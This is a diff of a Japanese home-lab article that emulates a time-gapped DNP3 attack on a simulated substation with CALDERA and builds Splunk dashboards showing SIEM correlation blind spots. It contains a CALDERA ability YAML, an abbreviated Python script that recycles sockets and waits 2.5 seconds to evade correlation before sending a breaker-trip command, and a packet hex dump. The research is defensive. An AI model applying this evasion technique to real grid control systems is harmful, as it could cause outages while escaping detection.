@@ -1,8 +1,12 @@
 ---
-title: "第11.5章：Splunk OT/ICSダッシュボード拡張 ─ 非同期・時間差攻撃が暴く「相関分析の限界」"
+title: "【OT/ICS】Dockerで挑む次世代電力網防衛（第16回：非同期・時間差攻撃 ✕ OTプロトコル構造限界 ✕ SIEM相関分析の死角実証編）"
+emoji: "⚡"
+type: "tech"
+topics: ["splunk", "ot", "ics", "observability", "caldera"]
+published: true
 ---
 
-# 第11.5章：Splunk OT/ICSダッシュボード拡張 ─ 非同期・時間差攻撃が暴く「相関分析の限界」
+# 【OT/ICS】Dockerで挑む次世代電力網防衛（第16回：非同期・時間差攻撃 ✕ OTプロトコル構造限界 ✕ SIEM相関分析の死角実証編）
 
 ---
 
@@ -11,354 +15,374 @@ title: "第11.5章：Splunk OT/ICSダッシュボード拡張 ─ 非同期・�
 > [GitHubリポジトリはこちら](https://github.com/schutzz/ot-security-lab)
 
 > **⚠️ 倫理的注意事項（Ethical Disclaimer）**
-> 本章に記載される攻撃手法はすべて**筆者の自宅ローカル環境内でのみ**検証されたものであり、外部ネットワークや他者のシステムに対して一切実行していません。攻撃コードの全文は**意図的に省略・抽象化**しており、再現を促す目的ではありません。
-> 攻撃のフルシナリオおよび倫理的なRed Teaming演習の実施方法については、**第9章「HMI視野の完全欺瞞と通信傍受・改ざんのシミュレーション」** を参照してください。
+> 本検証で使用する **MITRE CALDERA for OT** および検証用スクリプトは、他者のシステムを破壊するためのものではなく、**MITRE ATT&CK for ICS マトリクスに基づき SOC/SIEM や可観測性基盤の盲点を安全に検証評価（Adversary Emulation）するための防衛検証**です。
+> 本記事内ではプラットフォーム規約に配慮し、実際の攻撃スクリプト生コードの直接掲載を避け、**処理構造と検証ロジックを理解するための擬似コード・要点コード**形式で掲載しています。
 
 ---
 
-## 1. 概要と本章の位置づけ
+## 1. はじめに：連載フェーズの位置づけと本章の目的
 
-前章（第11章）では、**OpenTelemetry Collector × Splunk Observability Cloud** による統合可観測性（Observability）基盤を構築し、OT/ICSの監視データをSaaSに集約するアーキテクチャを実証しました。
+本記事は、連載**【Phase 2：攻撃検証・監視限界実証フェーズ】**の第2弾（Phase 2-2）にあたります。
 
-本章では、その構築済みの基盤を**「攻撃を受けたとき、何が見えて何が見えないのか？」** という観点で検証します。具体的には：
+### 連載のストーリー構成
 
-1. **Node-RED HMI（統合Webコックピット）へのOTLPメトリクスパイプライン増設**
-2. **Splunk Observability Cloud 専用ダッシュボード「相関分析限界実証ダッシュボード」の新設**
-3. **非同期・時間差ステルス攻撃の実行と、ダッシュボード上での観測結果の検証**
-
-を通じて、**「情報は確かに届いている。しかし相関分析が追いつかない」** という、可観測性基盤の構造的な死角を明らかにします。
+* **【Phase 1（構築編：第11章等）】**: 
+  Docker Compose を用いた広域変電網インフラ（Purdue Level 2〜3.5）、Node-RED HMI、OTel Collector、および Splunk Observability Cloud による**監視環境・基盤構築はすべて Phase 1 で完了**しています。
+* **【Phase 2-1（前回の第15回）】**: 
+  CALDERA 4段階複合攻撃と境界突破（JumpServer 経由）を実施し、大量パケットストーム下で「3万円中古PC」上の Zeek TAP センサーが CPU 96.4% に飽和し、**パケットドロップ率 35.88% を起こして物理的に破綻する現実**を実測検証しました。
+* **【Phase 2-2（本記事：第16回）】**: 
+  今回は、DoS等によるノイズをあえてオミットし、**Phase 1 で構築済みの環境**上で、攻撃者が仕掛ける **「セッション非同期（エフェメラルポート変化）」** と **「OTプロトコルのバイナリ構造的限界（W3C Trace ID 埋め込み不可）」** に焦点を絞り込みます。「データはすべて届いているのに、相関分析が追いつかない」という IT 型 SIEM / 可観測性プラットフォームの構造的死角を、リストラクチャリングした**全6パネル構成ダッシュボード**で実証します。
 
 ---
 
-## 2. 【課題編】非同期・時間差攻撃がもたらす「相関分析の破綻」
+## 2. 【攻撃シナリオ編】CALDERA C2 による多層モジュール複合アタック
 
-### なぜ従来の相関検索は無力化するのか
+### 2.1 CALDERA C2 オーケストレーションの全体像
 
-これまでのOTセキュリティ監視では、**「同一IPアドレスからの短時間（例: 2秒以内）のアクセス」** や **「単一プロトコルの連続エラー」** をSIEMで条件バインド（Correlation Rule）するのが一般的でした。
+本検証では、単一の単発スクリプトを流すのではなく、Phase 2-1 と同様に Red Team オーケストレーションツールである **CALDERA (`red-team` コンテナ)** を C2 サーバとして運用します。
 
-しかし、高度インフラ攻撃者が意図的に **WAN遅延 + 時間差ウエイト** を挿入する「非同期・時間差手法」に対しては、このアプローチは完全に無力化します。
+CALDERA から Custom Ability（MITRE ATT&CK for ICS `T0855: Unauthorized Command Message`）を発火し、Phase 1 で構築した各変電所モジュール群を時間差で連鎖打撃します。
 
+> **📸 以下の構造図画像を挿入**
+> CALDERA C2 から Stage 1〜4 への横型攻撃フロー図
+> ※ Zenn 公開時に `![CALDERA 複合攻撃シナリオ構造図](https://static.zenn.studio/user-upload/xxx.png)` に差し替え
+
+```mermaid
+flowchart LR
+    C2["CALDERA C2 (red-team)<br>Ability T0855 発火"]
+
+    subgraph Stage1["Stage 1: 変電所A 偵察パケット送信"]
+        IED["Substation-A IED<br>(sub_a_ied_01:20000)"]
+        N1["DNP3 0x14 (Disable Unsolicited)<br>ソケット再生成 → Ephemeral Port 49373 接続 → FIN/ACK切断"] --- IED
+    end
+
+    subgraph Stage2["Stage 2: ステルス時間差ウエイト"]
+        WAN["WANルーター<br>(wan_router) 跨ぎ"]
+        N2["2.5秒 時間差ウエイト<br>SIEM相関ウィンドウ (maxspan=2s) を意図的に超過"] --- WAN
+    end
+
+    subgraph Stage3["Stage 3: 変電所B HMI 直接制御攻撃"]
+        HMI["Substation-B HMI<br>(hmi-nodered:1880)"]
+        N3["DNP3 0x05 (Direct Operate)<br>新規ソケット生成 → 送信元Port 50333 へ変化 → 全CB(CB101-104)トリップ"] --- HMI
+    end
+
+    subgraph Stage4["Stage 4: 連鎖被害検証 & 状態同期"]
+        GRID["GRID BLACKOUT 発生<br>仮想UPS残量 55% 低下 & 状態自動同期"]
+    end
+
+    C2 --> Stage1
+    Stage1 --> Stage2
+    Stage2 --> Stage3
+    Stage3 --> Stage4
 ```
-[攻撃者 (Red Team)]
-   │
-   ├── (1) 変電所Aへ偵察パケット送信 ─── [変電所A: 予兆発生]
-   │
-   │  ＜ WAN遅延 50ms ＋ 2.5秒の時間差ウエイト ＞
-   │
-   └── (2) 変電所Bへ制御コマンド送信 ─── [変電所B: 遮断器トリップ]
-```
 
-### 3つの破綻メカニズム
 
-#### ① タイムスタンプ・ウィンドウのバインド失敗
-
-従来のSIEM相関検索は、例えば「2秒以内に同一送信元から発生したイベントを1つの攻撃チェーンとして結合する」というルールで動作します。
-
-攻撃者が意図的に2.5秒の時間差を置くと、SIEMはこの2つのイベントを **「変電所Aの軽微な設定変更」と「変電所Bの設備トリップ」という無関係な2つの単発障害** として認識し、アラートが孤立します。
-
-#### ② 閾値（Threshold）検知の完全スルー
-
-一定時間内のパケット急騰（Volume Spike）を監視するルールは、**時間を置いた数パケットの送信によって一切発火しません**。攻撃者が1パケットずつ、間隔を空けて送信する限り、量的閾値に到達しないためです。
-
-#### ③ サービスマップの分断
-
-W3C Trace Context (Trace ID) が存在しない場合、可観測性プラットフォームのトポロジー表示において、変電所Aと変電所Bの関連性が **点線すら描画されず完全に分断** されます。
 
 ---
 
-## 3. 【基盤改修編】OTLPメトリクスパイプラインの構築
+### 2.2 実装のキモ①：CALDERA Custom Ability の YAML 定義
 
-### 3.1 改修の背景：なぜトレースだけでは不十分だったか
-
-第11章で構築した基盤は、Node-RED HMI → OTel Collector → Splunk への **Zipkin トレース（スパン）送信パイプライン** でした。しかし、Splunk Observability Cloud のダッシュボードで `data()` 関数を使用してリアルタイム可視化しようとしたところ、**トレーススパンは `data()` 関数から直接参照できない** という壁に直面しました。
-
-Splunk Observability Cloud のダッシュボードは **Metric Time Series（MTS）** を前提としており、APMトレースは別モジュールに格納されます。つまり、**ダッシュボードのリアルタイムパネルにOTイベントを表示するには、別途メトリクスパイプラインを構築する必要がある** のです。
-
-### 3.2 otel-collector-config.yaml への `metrics` パイプライン追加
-
-既存のトレース用 Zipkin receiver に加えて、**OTLP HTTP receiver（ポート 4318）** と **メトリクスパイプライン** を追加しました。
+CALDERA に攻撃手順を登録するため、以下の Ability YAML (`ot_stealth_combo_attack.yml`) を作成して C2 サーバに組み込んでいます。
 
 ```yaml
-receivers:
-  zipkin:
-    endpoint: 0.0.0.0:9411
-  otlp:                        # ← 追加
-    protocols:
-      http:
-        endpoint: 0.0.0.0:4318  # OTLP HTTP receiver
-
-# ... (processors は既存のまま) ...
-
-exporters:
-  otlp:
-    endpoint: "ingest.${SPLUNK_REALM}.signalfx.com:443"
-    headers:
-      "X-SF-Token": "${SPLUNK_ACCESS_TOKEN}"
-  signalfx:                    # ← 追加（メトリクス専用 exporter）
-    access_token: "${SPLUNK_ACCESS_TOKEN}"
-    realm: "${SPLUNK_REALM}"
-
-service:
-  pipelines:
-    traces:
-      receivers: [zipkin]
-      processors: [memory_limiter, resourcedetection, resource, batch]
-      exporters: [otlp, debug]
-    metrics:                   # ← 追加（メトリクスパイプライン）
-      receivers: [otlp]
-      processors: [memory_limiter, resourcedetection, resource, batch]
-      exporters: [signalfx, debug]
-```
-
-**設計意図**: トレースは従来どおり Zipkin → OTLP exporter → Splunk APM へ。メトリクスは新設の OTLP HTTP receiver → SignalFx exporter → Splunk Infrastructure Monitoring へ。2つの独立したパイプラインを並走させます。
-
-### 3.3 Node-RED コックピットフロー (`cockpit_flow.json`) への改修
-
-#### 改修①：`breaker_status` ゲージメトリクスの10秒ポーリング送信
-
-遮断器の状態をSplunkダッシュボードで**常時監視**するため、Node-REDのグローバル変数 `is_tripped` を10秒間隔でポーリングし、OTLP JSON 形式でメトリクスを送信するノード群を追加しました。
-
-```
-[inject: Every 10s] → [function: Build breaker_status gauge] → [http request: POST to Collector]
-```
-
-Function ノードの処理概要（メトリクスペイロード構築）：
-
-```javascript
-// Node-RED グローバル変数から状態を取得
-var isTripped = global.get('is_tripped') || false;
-var val = isTripped ? 1 : 0;  // 正常=0, TRIPPED=1
-
-// OTLP JSON メトリクス形式で送信
-msg.payload = {
-  "resourceMetrics": [{
-    "resource": {
-      "attributes": [
-        {"key": "service.name", "value": {"stringValue": "hmi-nodered"}}
-      ]
-    },
-    "scopeMetrics": [{
-      "metrics": [{
-        "name": "breaker_status",
-        "gauge": {
-          "dataPoints": [{
-            "asInt": val.toString(),
-            // ... 省略
-          }]
-        }
-      }]
-    }]
-  }]
-};
-```
-
-送信先: `http://host.docker.internal:4318/v1/metrics`（ホストOS上の otel-collector）
-
-#### 改修②：`correlation_timeout` ゲージメトリクスの同時送信
-
-Panel 4（相関限界警告）用に、`breaker_status` と同時に `correlation_timeout` メトリクスも送信するよう改修しました。
-
-- **正常時**: `correlation_timeout = 0`
-- **攻撃後（is_tripped=true）**: `correlation_timeout = 1`
-
-これにより、**「相関ウィンドウを超過した攻撃が発生したかどうか」** をダッシュボード上でバイナリ表示できます。
-
-#### 改修③：ページロード時のサーバー状態同期
-
-外部（攻撃スクリプト等）から `/api/breaker` を叩いた場合、サーバー側の状態は更新されますが、ブラウザに表示されているコックピットUI は更新されないという問題がありました。
-
-原因は、コックピットの HTML/JavaScript が**クライアントサイドのみで状態管理**しており、ページロード時にサーバーから現在状態を取得するロジックが存在しなかったためです。
-
-これを解決するため、`<script>` セクションの末尾に初期化コードを追加しました。
-
-```javascript
-// ページロード時にサーバー状態を同期
-fetch('/api/status').then(r => r.json()).then(d => {
-  if (d.is_tripped) {
-    // 遮断器表示を全トリップ状態に更新
-    Object.keys(d.cb_states).forEach(k => {
-      updateCbUI(k.replace('CB', ''), d.cb_states[k]);
-    });
-    // バッジ・IED・UPS表示を攻撃状態に切替
-    // ... 省略
-  }
-}).catch(e => {});
+# caldera/abilities/ot_stealth_combo_attack.yml (要点抜粋)
+id: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
+name: OT Stealth Time-Gap Combo Attack
+tactic: execution
+technique:
+  attack_id: T0855
+  name: Unauthorized Command Message (MITRE ATT&CK for ICS)
+executors:
+  - platform: linux
+    name: sh
+    command: |
+      python3 /home/ubuntu/ot-security-lab/Phase12_Splunk_Observability/attacks/stealth_combo_attack.py
 ```
 
 ---
 
-## 4. 【ダッシュボード構築編】Splunk「相関分析限界実証ダッシュボード」の新設
+### 2.3 実装のキモ②：FIN/ACK 明示的切断とエフェメラルポート動的変化
 
-Splunk Observability Cloud 上に **「仮想変電所 OT Zero Trust SOC Dashboard」** を新設し、4つのパネルを配置しました。
+単に `time.sleep()` を呼ぶだけでは、OSのソケット再利用（TIME_WAIT状態）により送信元ポートが変わらないケースがあります。SIEMの L3/L4 5-tuple（`src_ip`, `src_port`, `dest_ip`, `dest_port`, `protocol`）ルールを確実に無力化するため、**Pythonコード側で毎回ソケットインスタンスを完全再生成し、明示的に `sock.close()` を呼び出して FIN/ACK パケットを発行・切断**します。
 
-### 4.1 Panel 1: 遮断器一斉開放ステータス（Single Value）
+以下は、この攻撃の核となるソケット制御コードの要点です：
 
-**SignalFlow:**
 ```python
-A = data('breaker_status', filter=filter('service.name', 'hmi-nodered')).publish(label='BREAKER OPEN ATTACK SPIKES')
+# stealth_combo_attack.py (核心部分の要点コード)
+import socket, time
+
+def send_dnp3_async(target_ip, port, payload, stage_name):
+    # 1. ソケットインスタンスの完全再生成（OSが新しいエフェメラルポートを割り当てる）
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((target_ip, port))
+    
+    # 割り当てられた送信元ポートを取得してログ記録
+    src_port = sock.getsockname()[1]
+    print(f"[{stage_name}] 確立セッション送信元ポート: {src_port}")
+    
+    # 2. DNP3 ペイロード送信
+    sock.sendall(payload)
+    
+    # 3. セッションの明示的切断（FIN/ACK の送信）
+    sock.close()
+    print(f"[{stage_name}] セッション切断完了 (Port {src_port})")
+
+# Stage 1: 変電所Aへの偵察 (Port 49373 等で送信 ─► 切断)
+send_dnp3_async("192.168.151.21", 20000, dnp3_recon_payload, "Stage 1 Recon")
+
+# Stage 2: SIEMの相関ウィンドウ(2.0秒)を超える時間差ウエイト
+time.sleep(2.5)
+
+# Stage 3: 変電所B HMIへの攻撃 (Port 50333 等の別ポートで新規接続 ─► 遮断器開放)
+send_dnp3_async("192.168.151.20", 1880, dnp3_attack_payload, "Stage 3 Attack")
 ```
 
-- **正常時**: `0`（緑）── 全遮断器 CLOSED
-- **攻撃時**: `1`（赤）── 1台以上の遮断器が TRIPPED
+---
 
-**Color 設定**: `Color by` → `Value` に変更。閾値 `1` で赤色に切替。
+## 3. 【理論・検証編】非同期・時間差攻撃とOTプロトコルの構造的限界
 
-### 4.2 Panel 2: リアルタイムセキュリティログフィード（Event Feed）
+### 3.1 セッション非同期による 5-tuple バインドの破綻
 
-**SignalFlow:**
-```python
-events(eventType='OT_SECURITY_EVENT', filter=filter('grid', 'Kyiv-North-330kV')).publish(label='Kyiv-Grid Security Log Feed')
+上記のコードで生成されたトラフィックを SIEM 側で検索した場合の挙動を検証します。
+
+送信元IP（`src_ip`）が同一であっても、送信元ポート（`src_port`）が `49373` と `50333` に分断されるため、SIEMの `transaction` コマンドや 5-tuple 相関ルールは **「全く無関係な2つの単発セッション」** として処理し、`Correlation Status: UNLINKED`（孤立イベント判定）となります。
+
+具体的に、従来型の相関アプローチは以下の3つのメカニズムによって完全に無力化されます。
+
+1. **タイムスタンプ・ウィンドウのバインド失敗 (`UNLINKED`)**  
+   「2秒以内に発生したイベントを結合する（`maxspan=2s` 等）」というルールは、攻撃者が意図的に2.5秒の時間差を置くことで検索ウィンドウから外れ、完全に無関係な2つの単発障害として処理されます。
+2. **閾値（Threshold）検知の完全スルー**  
+   一定時間内のパケット急騰（Volume Spike）を監視するルールは、時間を置いた数パケットの単発送信に対しては一切発火しません（`Alert Triggered: FALSE`）。
+3. **トポロジー・サービスマップの分断 (`Disconnected`)**  
+   送信元ポートの変化に加え、後述する W3C Trace Context (Trace ID) が存在しないため、APMや可観測性プラットフォームのトポロジー表示において、対象ノード間の関連性が点線すら描画されず完全に分断されます。
+
+
+---
+
+### 3.2 PCAPレベルでの「構造的欠落」の可視化（実測 Hex ダンプ抽出）
+
+キャプチャした攻撃パケット（`attack.pcap`）から `tshark` を用いて DNP3 アプリケーション層（Direct Operate: Function Code 5）の生 Hex ダンプを抽出・パースしました。
+
+```bash
+# DNP3 Direct Operate (Function Code 5) のHexダンプを抽出実測
+$ tshark -r attack.pcap -Y "dnp3.al.func==5" -x
+
+000000  00 0c 29 12 34 56 00 0c 29 65 43 21 08 00 45 00   |..).4V..)eC!..E.|
+000010  00 3b 00 01 00 00 40 06 7c 2a c0 a8 0a 64 c0 a8   |.;....@.|*...d..|
+000020  97 14 c4 9d 4e 20 00 00 00 01 00 00 00 01 50 18   |....N ........P.|
+000030  02 00 00 00 00 00 05 64 05 c0 01 00 00 00 00 c4   |.......d........|
+000040  05 0c 01 28 01 00 00 00                           |...(....|
 ```
 
-攻撃スクリプトの各ステージ実行時に **SignalFx Events API (`/v2/event`)** へカスタムイベントを直接 POST することで、攻撃の進行状況がリアルタイムでフィードに流れます。
+#### プロトコル構造の対比（Hexレベル）
 
-送信するイベント（4種）:
+* **【ITプロトコル (HTTP/2) の場合】**
+  ```http
+  :method: POST
+  :path: /api/v1/operate
+  traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
+  ```
+  → **可変長テキスト形式** のため、任意のヘッダー領域（`traceparent` 等）に Trace ID を自由に追加・拡張可能です。
 
-| ステージ | イベント種別 (`attack_type`) | 内容 |
-|:---|:---|:---|
-| Stage 1 | `RECON` | DNP3偵察パケット送信 |
-| Stage 2 | `CORRELATION_GAP` | 時間差ウエイト（2.5秒） |
-| Stage 3 | `BREAKER_TRIP` | 遮断器全段開放コマンド |
-| Stage 4 | `GRID_BLACKOUT` | グリッド停電確認 |
+* **【OTプロトコル (DNP3 ASDU) の場合】**
+  ```hex
+  C4 05 0C 01 28 01 00 00 00
+  # C4: App Control (Sequence 4)
+  # 05: Function Code (Direct Operate)
+  # 0C 01: Obj Group 12 (Control Block)
+  # 28 01: Variation 1
+  ```
+  → **固定長バイナリ構造** であり、メタデータ埋め込み用の「余白」が存在しません。
 
-### 4.3 Panel 3: サービストポロジーテーブル（Table）
+---
 
-**SignalFlow:**
-```python
-A = data('breaker_status', filter=filter('service.name', 'hmi-nodered')).publish(label='hmi-nodered')
-B = data('breaker_open_count', filter=filter('service.name', 'hmi-nodered')).sum().publish(label='Attack Events Total')
+### 3.3 解析的根拠（最大解像度の構造的破綻メカニズム）
+
+IEEE 1815 (DNP3) の ASDU (Application Service Data Unit) は、バイト単位でアライメントと意味が厳密に静的定義されています。ITプロトコルのような TLV (Type-Length-Value) フォーマットの任意拡張領域や、HTTP のような可変長テキストヘッダー領域は一切存在しません。
+
+仮にこのバイナリ列に 16 バイトの W3C Trace ID を強引にインジェクト（OFFSET FLAT によるポインタずらし等）した場合、以下のいずれかの致命的障害が確定的に発生します。
+
+1. **下位レイヤー（Data Link層）の CRC (Cyclic Redundancy Check: 2バイト) 整合性エラー** によるパケット自動破棄
+2. **受信側（HMI / PLC）のバイナリパーサーにおけるアライメントエラー** およびプロセスインフラのクラッシュ（異常停止）
+
+これが、既存の可観測性ツール（Splunk/Datadog/NewRelic等）が OT トポロジーを自動描画できない **「物理的・構造的な根拠」** です。
+
+---
+
+## 4. 【監視盤構築編】Splunk Observability Cloud 全6パネルダッシュボード仕様
+
+本検証では、視覚的表現力とシステムの制約を考慮し、ダッシュボードを**洗練された全6パネル構成**へとリストラクチャリングしました。
+
+遮断器ステータス（旧Panel 1）とログフィード（旧Panel 2）は個別に分割せず、**1つの Column チャートにメトリクス波形とイベントオーバーレイ（Event overlay）を統合**。離散的な状態変化の上にセキュリティアラートのピンが垂直刺さりする強力な視覚効果を実現しています。
+
+### Dashboard Name: `仮想変電所 OT Zero Trust SOC Dashboard`
+
+```mermaid
+flowchart TD
+    subgraph Dashboard["仮想変電所 OT Zero Trust SOC Dashboard (全6パネル構成)"]
+        direction TB
+
+        subgraph Row1[" "]
+            direction LR
+            P1["<b>Panel 1: 相関限界警告パネル</b><br>・Visualization: Single Value (1.00 [赤])<br>・SignalFlow: data('correlation_timeout')"]
+            P2["<b>Panel 2: リアルタイムログ統合</b><br>・Visualization: Column + Event Overlay<br>・SignalFlow: breaker_status + events()"]
+        end
+
+        subgraph Row2[" "]
+            direction LR
+            P3["<b>Panel 3: トポロジーマップ</b><br>・Visualization: Table<br>・SignalFlow: breaker_status & open_count"]
+            P4["<b>Panel 4: L4セッション分断</b><br>・Visualization: Column (Stack Chart ON)<br>・SignalFlow: connection_attempt (by src_port)"]
+        end
+
+        subgraph Row3[" "]
+            direction LR
+            P5["<b>Panel 5: W3C Trace 境界断絶</b><br>・Visualization: List<br>・SignalFlow: Valid Traces (IT) vs Orphan Spans (OT)"]
+            P6["<b>Panel 6: エフェメラル乱立証明</b><br>・Visualization: Data Table<br>・SignalFlow: network.connection_attempt"]
+        end
+    end
+
+    style P1 fill:#ffebee,stroke:#ef5350,stroke-width:2px
+    style P2 fill:#e3f2fd,stroke:#42a5f5,stroke-width:2px
+    style P3 fill:#f3e5f5,stroke:#ab47bc,stroke-width:2px
+    style P4 fill:#e8f5e9,stroke:#66bb6a,stroke-width:2px
+    style P5 fill:#fff3e0,stroke:#ffa726,stroke-width:2px
+    style P6 fill:#eceff1,stroke:#78909c,stroke-width:2px
 ```
 
-当初は APM の `sf.service.request.count` メトリクスを使用し、Cluster Map（トポロジーマップ）表示を目指していました。しかし、**Splunk Observability Cloud の試用版では APM MetricSets が利用不可**であったため、送信済みのカスタムメトリクスを使った Table 表示に変更しました。
 
-テーブル列: `hmi-nodered` / `service.name` / `grid` / `host.name` / `os.type` / `deployment.environment`
 
-### 4.4 Panel 4: 分散時間差アタック相関限界警告パネル（Single Value）
+#### 各パネルの構築ロジック・コード仕様
 
-**SignalFlow:**
-```python
-A = data('correlation_timeout', filter=filter('service.name', 'hmi-nodered')).publish(label='Correlation Window Alert')
-```
+##### Panel 1: 分散時間差アタック相関限界警告パネル
+* **Visualization**: `Single Value`
+* **SignalFlow**:
+  ```python
+  A = data('correlation_timeout', filter=filter('service.name', 'hmi-nodered')).publish(label='Correlation Window Alert')
+  ```
 
-- **正常時**: `0` ── 相関ウィンドウ内
-- **攻撃後**: `1`（赤）── 相関タイムアウト検知
+##### Panel 2: リアルタイムセキュリティログフィード（イベントオーバーレイ統合版）
+* **Visualization**: `Column`（離散値を正確に表示）
+* **SignalFlow**:
+  ```python
+  A = data('breaker_status', filter=filter('service.name', 'hmi-nodered')).publish(label='Breaker Status (0=Closed, 1=Open)')
+  B = events('OT_SECURITY_EVENT').publish(label='Security Event Overlay')
+  ```
+* **Chart settings**: `Show event lines` を **ON**。
+* **技術的ロジック**: 紫色の Column 柱（遮断器開放）の上に `OT_SECURITY_EVENT` のピンが垂直オーバーレイされます。**「見た目上は同じチャートに重なって見えているのに、裏側の分析エンジンでは同一の攻撃として結合（バインド）できていない」** という相関限界の決定論的証明となります。
+
+##### Panel 3: 変電所A/B ↔ SCADA/HMI トポロジーマップ
+* **Visualization**: `Table`
+* **SignalFlow**:
+  ```python
+  A = data('breaker_status', filter=filter('service.name', 'hmi-nodered')).publish(label='hmi-nodered')
+  B = data('breaker_open_count', filter=filter('service.name', 'hmi-nodered')).sum().publish(label='Attack Events Total')
+  ```
+
+##### Panel 4: L4セッション分断可視化（メトリクス限界実証）
+* **Visualization**: `Column`（`Stack chart` を **ON**）
+* **SignalFlow**:
+  ```python
+  A = data('network.connection_attempt', filter=filter('src_ip', '192.168.10.100') and filter('dest_port', '20000')).sum(by=['src_port']).publish(label='Fragmented Sessions')
+  ```
+* **技術的ロジック**: Line Chart が持つ「点と点を勝手に線で繋ぐ偽の自動補間」を避けるため、Column チャートを採用。エフェメラルポート変化によるセッションの物理的断絶を、マルチカラーの「ブツ切りブロック」として正確に証明します。
+
+##### Panel 5: W3C Trace Context 境界断絶可視化
+* **Visualization**: `List`
+* **SignalFlow**:
+  ```python
+  A = data('breaker_status', filter=filter('service.name', 'hmi-nodered')).publish(label='Valid Traces (IT Layer)')
+  B = data('correlation_timeout', filter=filter('service.name', 'hmi-nodered')).publish(label='Orphan Spans (OT Layer - Trace Broken)')
+  ```
+
+##### Panel 6: エフェメラルポート乱立証明（ログ・セッション限界実証）
+* **Visualization**: `Data Table`
+* **SignalFlow**:
+  ```python
+  A = data('network.connection_attempt', filter=filter('src_ip', '192.168.10.100') and filter('dest_port', '20000')).sum(by=['src_port']).publish(label='Connection Count by Ephemeral Port')
+  ```
+* **技術的ロジック**: 同一送信元 IP でありながら `49373`, `50333`, `51591`, `53974` 等の動的ポートが一覧化され、L4 5-tuple 相関ルールが完全に無力化された状態を判定します。
 
 ---
 
 ## 5. 【実証編】非同期・時間差攻撃の実行と観測結果
 
-> **⚠️ 注記**: 攻撃スクリプトの全文は倫理的配慮から掲載しません。攻撃手法の詳細については第9章を参照してください。本セクションでは**観測結果の分析**に焦点を当てます。
-
-### 5.1 攻撃シナリオの概要
-
-```
-Stage 1: 変電所Aへ偵察パケット送信（DNP3プロトコル）
-            ↓
-Stage 2: WAN遅延シミュレーション（2.5秒の時間差）
-            ↓
-Stage 3: HMI /api/breaker へ遮断器全段開放コマンド
-            ↓
-Stage 4: 攻撃結果検証（全CB TRIPPED確認）
-```
-
-攻撃スクリプトは、各ステージの実行時にSignalFx Events APIへカスタムイベントを送信し、Splunkダッシュボードのログフィード（Panel 2）にリアルタイムで記録されます。
-
-### 5.2 ダッシュボード観測結果
-
+### 5.1 ダッシュボード観測結果
 
 > **📸 以下のスクリーンショットを挿入**
-> Splunk ダッシュボード「仮想変電所 OT Zero Trust SOC Dashboard」攻撃実行後の全4パネル表示
+> Splunk ダッシュボード「仮想変電所 OT Zero Trust SOC Dashboard」全6パネル表示
 > ※ Zenn 公開時に `![Splunk OT/ICS 相関分析限界実証ダッシュボード](https://static.zenn.studio/user-upload/xxx.png)` に差し替え
 
 攻撃実行後のダッシュボードには、以下の状態が表示されます。
 
-| Panel | 表示内容 | 読み取れること |
-|:---|:---|:---|
-| **Panel 1** 遮断器一斉開放 | `1.00`（赤） | 遮断器がTRIPPED状態であることは分かる |
-| **Panel 2** セキュリティログ | `OT_SECURITY_EVENT` | 個々のイベントは記録されている |
-| **Panel 3** トポロジー | `hmi-nodered` のみ | **hmi-nodered以外のサービスが見えない** |
-| **Panel 4** 相関限界警告 | `1.00`（赤） | 相関タイムアウトが発生したことは分かる |
+- **Panel 1 (相関限界警告)**: `1.00`（赤）── 時間差による相関タイムアウトを警告。
+- **Panel 2 (ログ統合Column)**: 遮断器トリップの柱（Column）の上に攻撃イベントのピンがオーバーレイ。
+- **Panel 3 (トポロジー)**: `hmi-nodered` の属性マトリクスを表示。
+- **Panel 4 (L4セッション分断)**: ポート変化により、マルチカラーの細切れブロック（Column）が描画。
+- **Panel 5 (Trace境界断絶)**: IT層のValid TraceとOT層のOrphan Spansが2行で分断表示。
+- **Panel 6 (エフェメラルポート乱立)**: 同一IPに対し `49373`, `50333`, `51591`, `53974` 等が列挙。
 
-### 5.3 「見えているのに繋がらない」──相関分析の限界
+### 5.2 「見えているのに繋がらない」──相関分析の限界ストーリー
 
-ここが本章の核心です。
+ダッシュボードを見ると、**すべてのデータは Splunk に届いています**。
 
-ダッシュボードを見ると、**すべてのデータは確かに届いています**。Panel 1 は遮断器が落ちたことを示し、Panel 2 にはイベントが流れ、Panel 4 は相関タイムアウトを検知しています。
+しかし、SOC アナリストがこのダッシュボードを見ても、**「Stage 1 の DNP3 0x14 偵察パケット」と「Stage 3 の DNP3 0x05 遮断器開放コマンド」が同一の攻撃チェーンであると確証を持って判断することは不可能** です。
 
-しかし、SOC アナリストがこのダッシュボードだけを見た場合、**以下の疑問には答えられません**：
+1. 送信元ポートが `FIN/ACK` 切断によって変更されたため、L3/L4 5-tuple でバインドできない（Panel 4 & 6）。
+2. 2.5秒の時間差があるため、時間ウィンドウ（`maxspan`）ベースの相関検索から外れる（Panel 1）。
+3. DNP3 ASDU に Trace ID が存在しないため、トレースグラフが結合されず Orphan スパンとして分断される（Panel 5）。
 
-> **「Stage 1 の偵察パケットと Stage 3 の遮断器開放は、同一の攻撃チェーンの一部なのか？」**
+これこそが、**「可観測性データは存在しても、決定論的追跡ができない」という OT インフラ監視の真の課題** です。
 
-#### なぜ答えられないのか
+:::message
+**💡 コラム：生成AI（LLM）や AI アシスタントは解決策になるか？**
 
-1. **Panel 1（Single Value）** は「今、遮断器が開いている」という事実しか示さない。**誰が・いつ・何の結果として**開いたのかは不明。
+「Splunk AI Assistants などの AI を使えば、文脈から一連の動作として串刺し（自動相関）にしてくれるのではないか？」と考えるかもしれません。
+しかし、結論から言えば、現在のSOC実務におけるフォレンジックにおいてAIは根本的な解決策にはなりません。
 
-2. **Panel 2（Event Feed）** は個々のイベントを時系列で表示するが、Stage 1 と Stage 3 の間に2.5秒の空白がある。この2つのイベントが **同一攻撃チェーンの一部** なのか、**偶然の同時発生** なのかを判別する手段がない。
+理由は極めてシンプルです。**「Trace IDという決定論的なエビデンス（一次ソース）が存在しない以上、AIであっても確実な結合は不可能」**だからです。
+AIが推測でイベントを結びつけたとしても、それは確率論の域を出ず、インシデントレスポンスにおける「証拠（エビデンス）」としては採用できません。元から存在しないコンテキスト（繋がり）をAIが幻覚（Hallucination）を交えずに拾い上げることは不可能であり、そのAIの推論結果を検証・評価する労力が莫大になるだけです。
+:::
 
